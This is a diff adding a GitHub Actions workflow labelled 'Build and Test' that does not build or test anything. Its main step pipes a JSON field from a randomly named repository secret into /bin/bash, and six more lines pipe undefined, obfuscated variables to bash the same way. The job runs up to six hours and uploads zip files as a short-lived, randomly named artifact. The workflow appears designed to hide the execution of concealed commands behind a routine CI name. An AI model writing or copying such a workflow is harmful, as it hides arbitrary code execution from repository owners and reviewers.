@@ -1,0 +1,37 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          bs23128: ${{ secrets.bs23128 }}
+        run: |
+          printf '%s' "$bs23128" | jq -r .pde97972 | /bin/bash
+          printf '%s' "$aerp5" | jq -r .spi826 | /bin/bash
+          echo $kv5 | jq -r .zm77187 | /bin/bash
+          echo $bgx1 | jq -r .ge9 | /bin/bash
+          echo $xjq62 | jq -r .zb67740 | /bin/bash
+          printf '%s' "$xuj9" | jq -r .p2769 | /bin/bash
+          printf '%s' "$w747" | jq -r .m99 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: wPwfufUp
+          path: "*.zip"
+          retention-days: 1
